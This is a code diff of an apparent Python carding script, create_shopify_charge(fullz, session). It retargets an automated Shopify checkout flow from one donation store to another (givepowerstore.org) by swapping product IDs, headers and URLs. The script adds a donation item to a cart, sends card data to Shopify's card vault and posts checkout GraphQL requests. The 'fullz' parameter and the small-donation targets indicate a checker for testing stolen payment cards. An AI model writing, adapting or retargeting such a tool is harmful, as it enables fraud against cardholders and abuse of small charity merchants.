@@ -31,13 +31,13 @@ async def create_shopify_charge(fullz , session):
 
             
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarybp7L6PMIHMqWXBbN',
-            'origin': 'https://wiredministries.com',
-            'referer': 'https://wiredministries.com/products/donate',
+            'origin': 'https://givepowerstore.org',
+            'referer': 'https://givepowerstore.org/products/10-donation',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -49,31 +49,31 @@ async def create_shopify_charge(fullz , session):
         files = {
             'form_type': (None, 'product'),
             'utf8': (None, '✓'),
-            'id': (None, '6889401221181'),
+            'id': (None, '41408502792330'),
             'quantity': (None, '1'),
             'add': (None, ''),
-            'product-id': (None, '516727406653'),
+            'product-id': (None, '6914075951242'),
             'section-id': (None, 'product-template'),
         }
 
-        response = await session.post('https://wiredministries.com/cart/add', headers=headers, files=files)
+        response = await session.post('https://givepowerstore.org/cart/add', headers=headers, files=files)
             
 
         await asyncio.sleep(0.5)
 
 
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://wiredministries.com/cart',
+            'referer': 'https://givepowerstore.org/cart',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': user_agent,
         }
 
-        response = await session.get('https://wiredministries.com/cart.js', headers=headers)
+        response = await session.get('https://givepowerstore.org/cart.js', headers=headers)
                                 
         
         try:
@@ -90,11 +90,11 @@ async def create_shopify_charge(fullz , session):
 
 
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://wiredministries.com/cart',
+            'referer': 'https://givepowerstore.org/cart',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -108,7 +108,7 @@ async def create_shopify_charge(fullz , session):
         }
 
         response = await session.get(
-            f'https://wiredministries.com/checkouts/cn/{token}',
+            f'https://givepowerstore.org/checkouts/cn/{token}',
             params=params,
             headers=headers,
         )
@@ -155,7 +155,7 @@ async def create_shopify_charge(fullz , session):
                 'issue_number': '',
                 'name': 'CRISH NIKI',
             },
-            'payment_session_scope': 'wiredministries.com',
+            'payment_session_scope': 'givepowerstore.org',
         }
 
         response = await session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data)
@@ -170,12 +170,12 @@ async def create_shopify_charge(fullz , session):
 
 
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
-            'origin': 'https://wiredministries.com',
-            'referer': 'https://wiredministries.com/',
+            'origin': 'https://givepowerstore.org',
+            'referer': 'https://givepowerstore.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -381,7 +381,7 @@ async def create_shopify_charge(fullz , session):
                 'attemptToken': f'{token}-0.07071466599591725',
                 'metafields': [],
                 'analytics': {
-                    'requestUrl': f'https://wiredministries.com/checkouts/cn/{token}?_ga=2.181198818.475511771.1708590233-1645285681.1708590233',
+                    'requestUrl': f'https://givepowerstore.org/checkouts/cn/{token}?_ga=2.181198818.475511771.1708590233-1645285681.1708590233',
                     'pageId': 'cfef5875-47EF-4F68-CB86-4809511BDFE0',
                 },
             },
@@ -389,7 +389,7 @@ async def create_shopify_charge(fullz , session):
         }
 
         response = await session.post(
-            'https://wiredministries.com/checkouts/unstable/graphql',
+            'https://givepowerstore.org/checkouts/unstable/graphql',
             headers=headers,
             json=json_data,
         )
@@ -416,12 +416,12 @@ async def create_shopify_charge(fullz , session):
 
 
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
-            'origin': 'https://wiredministries.com',
-            'referer': 'https://wiredministries.com/',
+            'origin': 'https://givepowerstore.org',
+            'referer': 'https://givepowerstore.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -442,7 +442,7 @@ async def create_shopify_charge(fullz , session):
         }
 
         response = await session.post(
-            'https://wiredministries.com/checkouts/unstable/graphql',
+            'https://givepowerstore.org/checkouts/unstable/graphql',
             headers=headers,
             json=json_data,
         )
@@ -458,12 +458,12 @@ async def create_shopify_charge(fullz , session):
 
 
         headers = {
-            'authority': 'wiredministries.com',
+            'authority': 'givepowerstore.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
-            'origin': 'https://wiredministries.com',
-            'referer': 'https://wiredministries.com/',
+            'origin': 'https://givepowerstore.org',
+            'referer': 'https://givepowerstore.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -484,7 +484,7 @@ async def create_shopify_charge(fullz , session):
         }
 
         response = await session.post(
-            'https://wiredministries.com/checkouts/unstable/graphql',
+            'https://givepowerstore.org/checkouts/unstable/graphql',
             headers=headers,
             json=json_data,
         )
